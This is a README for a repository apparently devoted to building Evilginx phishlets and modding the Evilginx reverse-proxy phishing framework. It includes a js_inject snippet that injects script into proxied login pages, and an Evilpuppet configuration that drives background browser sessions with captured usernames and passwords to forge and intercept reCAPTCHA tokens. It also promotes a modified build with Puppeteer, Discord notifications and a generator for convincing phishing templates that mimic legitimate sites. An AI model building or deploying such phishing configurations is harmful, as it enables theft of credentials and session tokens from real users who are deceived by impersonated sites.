This repository was created solely to assist in the creation of PHISHLETS / Modification of the Evilginx software itself / In solving any problems associated with this software and PHISHLETS.

__Preface:__ At the moment, there are a very large number of scammers who sell public, raw goods, people who do not understand at all how Reverse Proxy works. Watching these people on hacker sites, telegram channels and on the Internet in general becomes funny. There is nothing complicated in creating a template for EvilGinx; the entire manual is described by the founder himself 
[kgretzky](https://github.com/kgretzky) "Owner") __[__thanks to him for this creation__]__ It is for this reason that we decided to make a small laboratory for mutual assistance in this matter.

### #Installation Stepsâ€‹

### #Phishlet Format (v3.0.0-vX.X.X)

Phishlets are configuration files in YAML format. If you need to get familiar with YAML, first, you can find some good overview here: [YAML Syntax](https://docs.ansible.com/ansible/latest/reference_appendices/YAMLSyntax.html)

### #js_inject
This section defines all Javascript scripts that you want to inject into proxied pages. Every script can be customized with {var_name} variable parameters, which later can be set to different values in each created lure.
```
js_inject:
  - trigger_domains: ["www.domain.com"]
    trigger_paths: ["/uas/login"]
    trigger_params: ["email"]
    script: |
      function lp(){
        var email = document.querySelector("#username");
        var password = document.querySelector("#password");
        if (email != null && password != null) {
          email.value = "{email}";
          password.focus();
          return;
        }
        setTimeout(function(){lp();}, 100);
      }
      setTimeout(function(){lp();}, 100);
```
>### info
This part applies only to Evilginx Pro users who have access to Evilpuppet module.

Interactive background browser sessions, spawned on-demand, with sole purpose of forging secret tokens to be used within the proxied Evilginx session.

```
evilpuppet:
  triggers:
    - domains: ['www.domain.com']
      paths: ['/sessions']
      token: 'recaptcha_token'
      open_url: 'https://www.domain.com/signin'
      actions:
        - selector: '#email'
          value: '{username}'
          enter: false
          click: false
          post_wait: 0
        - selector: '#password'
          value: '{password}'
          enter: false
          click: false
          post_wait: 0
        - selector: '#stay_signed_in'
          click: true
          post_wait: 0
        - selector: '#signin_button'
          click: true
          post_wait: 0
  interceptors:
    - token: 'recaptcha_token'
      url_re: '/sessions'
      post_re: 'recaptcha_token=([^&]*)'
      abort: true
```


#5 Puppeteer integration with Evilginx 

Evilginx X Puppeteer
https://github.com/Evi1Grey5/Evilginx-3-PHISHLET-LAB/issues/13

# Evilginx 3.9.0
<img align="left" src="https://github.com/user-attachments/assets/67c5cb62-7c60-40b2-bb0e-4a30eaeb2949" width="450" height="550">
#### We also added Puppeteer to Evilginx and added some modifications to the http_proxy.go and phishlet.go. It turned out to be a juicy mod.

____________________
We decided to make a good mod for Evilginx. By adding Evil Puppet to it / Sending notifications via Discord / Module for generating PHISHLETs, collecting configurations via Burp Suite [ Functionality:

Template Generation: The module can create various violet templates that mimic legitimate websites.
Content Customization: The user can customize text, images, and other elements to make the phishlet more believable.
Integration with Burp Suite: The module can be integrated into Burp Suite to facilitate the testing and vulnerability analysis process.
Automation: Allows you to quickly create many phishlets for different scenarios.]
